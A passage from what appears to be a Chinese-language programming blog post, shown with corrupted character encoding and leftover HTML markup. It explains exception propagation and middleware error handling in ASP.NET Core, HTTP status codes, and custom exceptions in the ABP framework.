            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                             â†“
         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
         â”‚  ã€Service å±‚ã€‘ä¸šåŠ¡é€»è¾‘              â”‚
         â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
         â”‚                                      â”‚
         â”‚  <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">GetUser</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> id</span>)         â”‚
         â”‚</span>  {                                   â”‚
         â”‚    <span class="hljs-comment">// å‚æ•°éªŒè¯                       â”‚</span>
         â”‚    <span class="hljs-keyword">if</span> (id &lt;= <span class="hljs-number">0</span>)                      â”‚
         â”‚      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ValidationException();â”‚
         â”‚                                      â”‚
         â”‚    <span class="hljs-comment">// ä» DI å®¹å™¨è·å– Repository     â”‚</span>
         â”‚    <span class="hljs-keyword">var</span> user = _userRepository        â”‚  â† DI å®¹å™¨æ³¨å…¥
         â”‚                   .GetById(id);      â”‚
         â”‚                                      â”‚
         â”‚    <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span>)                 â”‚
         â”‚      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> NotFoundException();   â”‚
         â”‚                                      â”‚
         â”‚    <span class="hljs-keyword">return</span> user;                      â”‚
         â”‚  }                                   â”‚
         â”‚                                      â”‚
         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                             â†“
       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
       â”‚  ã€Repository å±‚ã€‘æ•°æ®è®¿é—®                â”‚
       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
       â”‚                                           â”‚
       â”‚  <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">GetById</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> id</span>)              â”‚
       â”‚</span>  {                                        â”‚
       â”‚    <span class="hljs-keyword">return</span> _dbContext.Users.Find(id);      â”‚
       â”‚  }                                        â”‚
       â”‚                                           â”‚
       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                             â†“
      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
      â”‚  ã€æ•°æ®åº“ / å¤–éƒ¨ç³»ç»Ÿã€‘                      â”‚
      â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
      â”‚                                              â”‚
      â”‚  SQL Server / MySQL / MongoDB / API         â”‚
      â”‚                                              â”‚
      â”‚  âœ… æˆåŠŸï¼šè¿”å›æ•°æ®                           â”‚
      â”‚  âŒ å¼‚å¸¸ï¼šæŠ›å‡ºå¼‚å¸¸ (è¿æ¥è¶…æ—¶ã€æŸ¥è¯¢å¤±è´¥ç­‰)    â”‚
      â”‚                                              â”‚
      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                             â†“

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                    ã€å¼‚å¸¸å‘ä¸Šä¼ æ’­ - ä¸Šå‡æµåŠ¨ã€‘
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

                    ğŸ’¥ å¼‚å¸¸äº§ç”Ÿï¼ˆæ•°æ®åº“ï¼‰
                             â†‘
                ã€Repositoryã€‘æŠ›å¼‚å¸¸å‘ä¸Š
                    ï¼ˆæ²¡æœ‰ <span class="hljs-keyword">catch</span>ï¼‰
                             â†‘
              ã€Serviceã€‘æ•è·ï¼Ÿé€šå¸¸å†æŠ›å¼‚å¸¸
              â”Œâ”€ <span class="hljs-keyword">try</span> { _repo.GetById() }
              â””â”€ <span class="hljs-keyword">catch</span> { <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> BusinessException(...) }
                             â†‘
            ã€Controllerã€‘æ•è·ï¼Ÿé€šå¸¸ä¸å¤„ç†
            ï¼ˆå‡è®¾ Service æŠ›äº†å¼‚å¸¸ï¼‰
                             â†‘
        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
        â”‚          Pipelineï¼šä¸­é—´ä»¶ç®¡é“ (å‘ä¸Šè¿”å›)        â”‚
        â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
        â”‚                                                â”‚
        â”‚  ã€ç¬¬<span class="hljs-number">5</span>å±‚ã€‘è·¯ç”±ä¸­é—´ä»¶                           â”‚
        â”‚  â”œâ”€ å¼‚å¸¸å‘ä¸Šä¼ æ’­                              â”‚
        â”‚  â””â”€ <span class="hljs-keyword">catch</span>ï¼Ÿæ²¡æœ‰                               â”‚
        â”‚              â†‘                                 â”‚
        â”‚  ã€ç¬¬<span class="hljs-number">4</span>å±‚ã€‘æˆæƒä¸­é—´ä»¶                           â”‚
        â”‚  â”œâ”€ å¼‚å¸¸å‘ä¸Šä¼ æ’­                              â”‚
        â”‚  â””â”€ <span class="hljs-keyword">catch</span>ï¼Ÿæ²¡æœ‰                               â”‚
        â”‚              â†‘                                 â”‚
        â”‚  ã€ç¬¬<span class="hljs-number">3</span>å±‚ã€‘è®¤è¯ä¸­é—´ä»¶                           â”‚
        â”‚  â”œâ”€ å¼‚å¸¸å‘ä¸Šä¼ æ’­                              â”‚
        â”‚  â””â”€ <span class="hljs-keyword">catch</span>ï¼Ÿæ²¡æœ‰                               â”‚
        â”‚              â†‘                                 â”‚
        â”‚  ã€ç¬¬<span class="hljs-number">2</span>å±‚ã€‘æ—¥å¿—ä¸­é—´ä»¶                           â”‚
        â”‚  â”œâ”€ å¯èƒ½è®°å½•å¼‚å¸¸                              â”‚
        â”‚  â””â”€ <span class="hljs-keyword">catch</span>ï¼Ÿå¯èƒ½æœ‰ï¼Œä½†é€šå¸¸åªæ˜¯è®°å½•åç»§ç»­æŠ›     â”‚
        â”‚              â†‘                                 â”‚
        â”‚  ã€ç¬¬<span class="hljs-number">1</span>å±‚ã€‘å¼‚å¸¸å¤„ç†ä¸­é—´ä»¶                       â”‚
        â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
        â”‚  â”‚ <span class="hljs-keyword">try</span> {                                   â”‚  â”‚
        â”‚  â”‚   <span class="hljs-keyword">await</span> _next(context)                  â”‚  â”‚
        â”‚  â”‚                                         â”‚  â”‚
        â”‚  â”‚ } <span class="hljs-keyword">catch</span> (Exception ex) {                â”‚  â”‚
        â”‚  â”‚   ğŸ›‘ å¼‚å¸¸åœ¨è¿™é‡Œè¢«ç»ˆæ­¢ï¼                 â”‚  â”‚
        â”‚  â”‚                                         â”‚  â”‚
        â”‚  â”‚   <span class="hljs-comment">// åˆ¤æ–­å¼‚å¸¸ç±»å‹                       â”‚  â”‚</span>
        â”‚  â”‚   <span class="hljs-keyword">if</span> (ex <span class="hljs-keyword">is</span> ValidationException)        â”‚  â”‚
        â”‚  â”‚     <span class="hljs-keyword">return</span> <span class="hljs-number">422</span>;                         â”‚  â”‚
        â”‚  â”‚   <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ex <span class="hljs-keyword">is</span> NotFoundException)     â”‚  â”‚
        â”‚  â”‚     <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;                         â”‚  â”‚
        â”‚  â”‚   <span class="hljs-keyword">else</span>                                  â”‚  â”‚
        â”‚  â”‚     <span class="hljs-keyword">return</span> <span class="hljs-number">500</span>;                         â”‚  â”‚
        â”‚  â”‚                                         â”‚  â”‚
        â”‚  â”‚   <span class="hljs-comment">// ç”Ÿæˆé”™è¯¯å“åº”                       â”‚  â”‚</span>
        â”‚  â”‚   <span class="hljs-keyword">await</span> context.Response                â”‚  â”‚
        â”‚  â”‚     .WriteAsJsonAsync(errorResponse);   â”‚  â”‚
        â”‚  â”‚ }                                       â”‚  â”‚
        â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
        â”‚              â†“                                 â”‚
        â”‚       å¼‚å¸¸å¤„ç†å®Œæ¯•ï¼Œä¸å†å‘ä¸Š                  â”‚
        â”‚       è¿”å›é”™è¯¯å“åº”ç»™å®¢æˆ·ç«¯                    â”‚
        â”‚                                                â”‚
        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                             â†“
                        HTTP å“åº”
                    (çŠ¶æ€ç  + JSON ä½“)
                             â†“
                      ã€å®¢æˆ·ç«¯æ¥æ”¶ã€‘


â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                         å…³é”®è¦ç‚¹
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

âœ… ã€DI å®¹å™¨ã€‘
   - Service é€šè¿‡ DI å®¹å™¨ä» Controller è·å–
   - Repository é€šè¿‡ DI å®¹å™¨ä» Service è·å–
   - æ‰€æœ‰ä¾èµ–éƒ½ç”±å®¹å™¨ç®¡ç†ï¼Œè§£è€¦åˆ

âœ… ã€å¼‚å¸¸ä¼ æ’­é“¾ã€‘
   æ•°æ®åº“å¼‚å¸¸
        â†‘
   Repository æŠ›å¼‚å¸¸
        â†‘
   Service æ•è· â†’ è½¬æ¢ä¸º BusinessException â†’ ç»§ç»­æŠ›
        â†‘
   Controllerï¼ˆé€šå¸¸ä¸å¤„ç†ï¼‰
        â†‘
   ä¸­é—´ä»¶ä»¬ï¼ˆé€šå¸¸ä¸å¤„ç†ï¼‰
        â†‘
   å¼‚å¸¸å¤„ç†ä¸­é—´ä»¶ ğŸ›‘ æœ€ç»ˆæ•è·ï¼

âœ… ã€ä¸ºä»€ä¹ˆå¼‚å¸¸å¤„ç†ä¸­é—´ä»¶åœ¨æœ€é¡¶å±‚ã€‘
   - å› ä¸ºå¼‚å¸¸æ˜¯å‘ä¸Šä¼ æ’­çš„
   - è¶Šå¾€é¡¶å±‚è¶Šèƒ½æ•è·æ›´å¤šçš„å¼‚å¸¸
   - ç¬¬<span class="hljs-number">1</span>å±‚çš„ <span class="hljs-keyword">catch</span> æ˜¯æ•´ä¸ªåº”ç”¨çš„æœ€åé˜²çº¿
   - ç¡®ä¿æ²¡æœ‰å¼‚å¸¸<span class="hljs-string">"é€ƒè„±"</span>

âœ… ã€å¤„ç†æµç¨‹å°ç»“ã€‘
   è¯·æ±‚å‘ä¸‹ â†’ ç»è¿‡ç®¡é“ â†’ åˆ°è¾¾ Controller
          â†’ è°ƒç”¨ Serviceï¼ˆé€šè¿‡ DIï¼‰
          â†’ Service è°ƒç”¨ Repositoryï¼ˆé€šè¿‡ DIï¼‰
          â†’ Repository è°ƒç”¨æ•°æ®åº“
   
   å¼‚å¸¸å‘ä¸Š â†’ ä»æ•°æ®åº“/ä¸šåŠ¡é€»è¾‘äº§ç”Ÿ
          â†’ å‘ä¸Šä¼ æ’­... 
          â†’ è¢«å¼‚å¸¸å¤„ç†ä¸­é—´ä»¶ <span class="hljs-keyword">catch</span> ğŸ›‘ ç»ˆæ­¢
          â†’ è¿”å›é”™è¯¯å“åº”

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
</code></pre>
<h4 data-id="heading-22">ä¸ºä»€ä¹ˆæŠ›é”™èƒ½è¢«è¯»æ‡‚å’Œæ¥æ”¶</h4>
<p>context.Response.StatusCode = statusCode;</p>
<pre><code class="hljs language-markdown" lang="markdown">ã€è§£é‡Šã€‘
<span class="hljs-bullet">1.</span> contextï¼ˆä¸Šä¸‹æ–‡ï¼‰
<span class="hljs-bullet">   -</span> ä»£è¡¨å½“å‰çš„ HTTP è¯·æ±‚å’Œå“åº”
<span class="hljs-bullet">   -</span> åŒ…å«äº†è¯·æ±‚çš„æ‰€æœ‰ä¿¡æ¯ï¼ˆURLã€å‚æ•°ã€Body ç­‰ï¼‰
<span class="hljs-bullet">   -</span> ä¹ŸåŒ…å«äº†å³å°†è¿”å›ç»™å®¢æˆ·ç«¯çš„å“åº”ä¿¡æ¯

<span class="hljs-bullet">2.</span> Responseï¼ˆå“åº”ï¼‰
<span class="hljs-bullet">   -</span> HTTP å“åº”å¯¹è±¡
<span class="hljs-bullet">   -</span> ç”¨æ¥è®¾ç½®è¿”å›ç»™å®¢æˆ·ç«¯çš„å†…å®¹

<span class="hljs-bullet">3.</span> StatusCodeï¼ˆçŠ¶æ€ç ï¼‰
<span class="hljs-bullet">   -</span> è¿™æ˜¯å“åº”çš„çŠ¶æ€è¡Œä¸­çš„æ•°å­—
<span class="hljs-bullet">   -</span> å®ƒå‘Šè¯‰å®¢æˆ·ç«¯ï¼š"è¿™ä¸ªè¯·æ±‚çš„ç»“æœå¦‚ä½•ï¼Ÿ"

<span class="hljs-bullet">4.</span> = statusCodeï¼ˆèµ‹å€¼ï¼‰
<span class="hljs-bullet">   -</span> å°†å˜é‡ statusCode çš„å€¼èµ‹ç»™ Response. StatusCode
<span class="hljs-bullet">   -</span> ä¾‹å¦‚ï¼šstatusCode = 404ï¼Œå°±è®¾ç½®ä¸º HTTP 404
</code></pre>
<p>await context. Response.WriteAsJsonAsync(errorResponse);</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-number">1.</span> context. <span class="hljs-title class_">Response</span>ï¼ˆå“åº”å¯¹è±¡ï¼‰
   - è¿™æ˜¯å³å°†è¿”å›ç»™å®¢æˆ·ç«¯çš„ <span class="hljs-variable constant_">HTTP</span> å“åº”
   - æˆ‘ä»¬è¦æŠŠå†…å®¹å†™å…¥è¿™ä¸ªå¯¹è±¡

<span class="hljs-number">2.</span> <span class="hljs-title class_">WriteAsJsonAsync</span>ï¼ˆå¼‚æ­¥å†™å…¥ <span class="hljs-title class_">JSON</span>ï¼‰
   - å°†å¯¹è±¡åºåˆ—åŒ–ï¼ˆè½¬æ¢ï¼‰ä¸º <span class="hljs-title class_">JSON</span> æ ¼å¼
   - <span class="hljs-string">"å¼‚æ­¥"</span>æ„å‘³ç€è¿™æ˜¯ä¸€ä¸ªå¼‚æ­¥æ“ä½œï¼Œéœ€è¦ <span class="hljs-keyword">await</span>
   - éœ€è¦ç­‰å¾…æ•°æ®å†™å…¥å®Œæˆ

<span class="hljs-number">3.</span> errorResponseï¼ˆé”™è¯¯å“åº”å¯¹è±¡ï¼‰
   - ä¸€ä¸ª <span class="hljs-title class_">ErrorResponse</span> å¯¹è±¡ï¼ŒåŒ…å«ï¼š
     {
       <span class="hljs-string">"statusCode"</span>: <span class="hljs-number">404</span>,
       <span class="hljs-string">"code"</span>: <span class="hljs-string">"NOT_FOUND"</span>,
       <span class="hljs-string">"message"</span>: <span class="hljs-string">"ç”¨æˆ· 123 ä¸å­˜åœ¨"</span>,
       <span class="hljs-string">"timestamp"</span>:  <span class="hljs-string">"2026-01-14..."</span>
     }

<span class="hljs-number">4.</span> åºåˆ—åŒ–è¿‡ç¨‹
   <span class="hljs-title class_">ErrorResponse</span> å¯¹è±¡
     â†“
   è½¬æ¢ä¸º <span class="hljs-title class_">JSON</span> å­—ç¬¦ä¸²
     â†“
   å†™å…¥ <span class="hljs-variable constant_">HTTP</span> å“åº”ä½“
     â†“
   å®¢æˆ·ç«¯æ¥æ”¶

ã€å®Œæ•´è¿‡ç¨‹ã€‘

<span class="hljs-keyword">var</span> errorResponse = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorResponse</span>
{
    <span class="hljs-title class_">StatusCode</span> = <span class="hljs-number">404</span>,
    <span class="hljs-title class_">Code</span> = <span class="hljs-string">"NOT_FOUND"</span>,
    <span class="hljs-title class_">Message</span> = <span class="hljs-string">"ç”¨æˆ· 123 ä¸å­˜åœ¨"</span>,
    <span class="hljs-title class_">Timestamp</span> = <span class="hljs-title class_">DateTime</span>. <span class="hljs-title class_">UtcNow</span>
};
</code></pre>
<p>å¦‚ä¸Š:</p>
<pre><code class="hljs">å®¢æˆ·ç«¯httpæ¥æ”¶åˆ°åå¯ä»¥æ ¹æ®çŠ¶æ€ç å’Œå¾—åˆ°çš„è¿”å›json,çŸ¥é“å½“å‰è¯·æ±‚çš„çŠ¶æ€å’Œæ•°æ®
</code></pre>
<h2 data-id="heading-23">ABPå¼‚å¸¸å¤„ç†</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fabp.io%2Fdocs%2Flatest%2Fframework%2Ffundamentals%2Fexception-handling" target="_blank" title="https://abp.io/docs/latest/framework/fundamentals/exception-handling" ref="nofollow noopener noreferrer">abp.io/docs/latestâ€¦</a></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbpExceptionHandlingMiddleware</span> : <span class="hljs-type">AbpMiddlewareBase</span>, <span class="hljs-type">ITransientDependency</span>

ABPå°è£…äº†å¼‚å¸¸å¤„ç†ä¸­é—´ä»¶
</code></pre>
<h3 data-id="heading-24">è‡ªå®šä¹‰å¼‚å¸¸</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">AbpRateLimitException</span> : <span class="hljs-title">BusinessException</span>,<span class="hljs-title">IHasHttpStatusCode</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> RetryAfterSeconds { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = <span class="hljs-number">60</span>;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">AbpRateLimitException</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> retryAfterSeconds = <span class="hljs-number">60</span></span>) 
        : <span class="hljs-title">base</span>(<span class="hljs-params"><span class="hljs-string">"è¯·æ±‚è¿‡äºé¢‘ç¹ï¼Œè¯·ç¨åå†è¯•ã€‚"</span>,<span class="hljs-string">"RateLimitException"</span></span>)</span>
    {
        RetryAfterSeconds = retryAfterSeconds;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> HttpStatusCode =&gt; <span class="hljs-number">429</span>;
}



	
Error: response status <span class="hljs-keyword">is</span> <span class="hljs-number">429</span>
Response body
{
  <span class="hljs-string">"error"</span>: {
    <span class="hljs-string">"code"</span>: <span class="hljs-string">"è¯·æ±‚è¿‡äºé¢‘ç¹ï¼Œè¯·ç¨åå†è¯•ã€‚"</span>,
    <span class="hljs-string">"message"</span>: <span class="hljs-string">"å¯¹ä¸èµ·ï¼Œåœ¨å¤„ç†æ‚¨çš„è¯·æ±‚æœŸé—´äº§ç”Ÿäº†ä¸€ä¸ªæœåŠ¡å™¨å†…éƒ¨é”™è¯¯ï¼ï¼"</span>,
    <span class="hljs-string">"details"</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-string">"data"</span>: {},
    <span class="hljs-string">"validationErrors"</span>: <span class="hljs-literal">null</span>
  }
}
</code></pre>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">AbpRateLimitException</span> : <span class="hljs-title">UserFriendlyException</span>,<span class="hljs-title">IHasHttpStatusCode</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> RetryAfterSeconds { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; } = <span class="hljs-number">60</span>;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">AbpRateLimitException</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> retryAfterSeconds = <span class="hljs-number">60</span></span>) 
        : <span class="hljs-title">base</span>(<span class="hljs-params"><span class="hljs-string">$"è¯·æ±‚è¿‡äºé¢‘ç¹ï¼Œè¯·<span class="hljs-subst">{retryAfterSeconds}</span>ç§’åå†è¯•ã€‚"</span>,<span class="hljs-string">"RateLimitException"</span></span>)</span>
    {
        RetryAfterSeconds = retryAfterSeconds;
       
         <span class="hljs-comment">// âœ… ç›´æ¥è®¾ç½® Data å­—å…¸,æ‰©å±•å­—æ®µæ•°æ®,æ¥è‡³äºException</span>
        <span class="hljs-comment">//this.Data["retryAfterSeconds"] = retryAfterSeconds;</span>
            
       <span class="hljs-comment">//ä½¿ç”¨å†…ç½®çš„WithData æ–¹æ³•</span>
       WithData(<span class="hljs-string">"retryAfterSeconds"</span>,retryAfterSeconds);
    }
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> HttpStatusCode =&gt; <span class="hljs-number">429</span>;
}


Error: response status <span class="hljs-keyword">is</span> <span class="hljs-number">429</span>
Response body
{
  <span class="hljs-string">"error"</span>: {
    <span class="hljs-string">"code"</span>: <span class="hljs-string">"RateLimitException"</span>,
    <span class="hljs-string">"message"</span>: <span class="hljs-string">"è¯·æ±‚è¿‡äºé¢‘ç¹ï¼Œè¯·ç¨åå†è¯•ã€‚"</span>,   
    <span class="hljs-string">"details"</span>: <span class="hljs-literal">null</span>,
    <span class="hljs-string">"data"</span>: {},
    <span class="hljs-string">"validationErrors"</span>: <span class="hljs-literal">null</span>
  }
}


<span class="hljs-comment">//ç»§æ‰¿çš„ABPå°è£…çš„å¼‚å¸¸ç±»ä¸åŒ,Code/messageä¹Ÿä¸åŒ,åŒæ—¶éUserFriendlyException,ä¼šè¢«è¦†ç›–messageæ•°æ®,åªæœ‰åœ¨logä¸­æ‰èƒ½çœ‹åˆ°.</span>
</code></pre>
<h2 data-id="heading-25">æ‹“å±•</h2>
<h3 data-id="heading-26">HttpçŠ¶æ€ç </h3>
<p>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ çŠ¶æ€ç  â”‚ å«ä¹‰ â”‚ ä½•æ—¶ä½¿ç”¨ â”‚ â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”‚ 200 â”‚ OKï¼ˆæˆåŠŸï¼‰ â”‚ GET, PUT, PATCH æˆåŠŸ â”‚ â”‚ 201 â”‚ Createdï¼ˆå·²åˆ›å»ºï¼‰ â”‚ POST åˆ›å»ºæˆåŠŸ â”‚ â”‚ 204 â”‚ No Contentï¼ˆæ— å†…å®¹ï¼‰ â”‚ DELETE æˆåŠŸ â”‚ â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”‚ 400 â”‚ Bad Requestï¼ˆåè¯·æ±‚ï¼‰â”‚ å‚æ•°éªŒè¯å¤±è´¥ â”‚ â”‚ 401 â”‚ Unauthorizedï¼ˆæœªæˆæƒï¼‰â”‚ æœªç™»å½•æˆ– Token è¿‡æœŸ â”‚ â”‚ 403 â”‚ Forbiddenï¼ˆç¦æ­¢ï¼‰ â”‚ å·²ç™»å½•ä½†æƒé™ä¸è¶³ â”‚ â”‚ 404 â”‚ Not Foundï¼ˆæœªæ‰¾åˆ°ï¼‰ â”‚ èµ„æºä¸å­˜åœ¨ â”‚ â”‚ 409 â”‚ Conflictï¼ˆå†²çªï¼‰ â”‚ æ•°æ®å†²çª â”‚ â”‚ 429 â”‚ Too Manyï¼ˆå¤ªå¤šï¼‰ â”‚ è¯·æ±‚è¿‡äºé¢‘ç¹ï¼ˆé™æµï¼‰â”‚ â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”‚ 500 â”‚ Server Errorï¼ˆæœåŠ¡å™¨é”™è¯¯ï¼‰ â”‚ æœªå¤„ç†çš„å¼‚å¸¸ â”‚ â”‚ 502 â”‚ Bad Gatewayï¼ˆç½‘å…³é”™è¯¯ï¼‰ â”‚ ä¸Šæ¸¸æœåŠ¡æ•…éšœ â”‚ â”‚ 503 â”‚ Unavailableï¼ˆä¸å¯ç”¨ï¼‰â”‚ æœåŠ¡ç»´æŠ¤æˆ–è¿‡è½½ â”‚ â”‚ 504 â”‚ Timeoutï¼ˆè¶…æ—¶ï¼‰ â”‚ è¯·æ±‚å¤„ç†è¶…æ—¶ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</p>
<h3 data-id="heading-27">ä¸ºä»€ä¹ˆASP.NET Coreæ¡†æ¶ä¸ä¼šå› ä¸ºå¼‚å¸¸è€Œå´©æºƒï¼Ÿ</h3>
<p>æ¶æ„å¯¹æ¯”</p>



































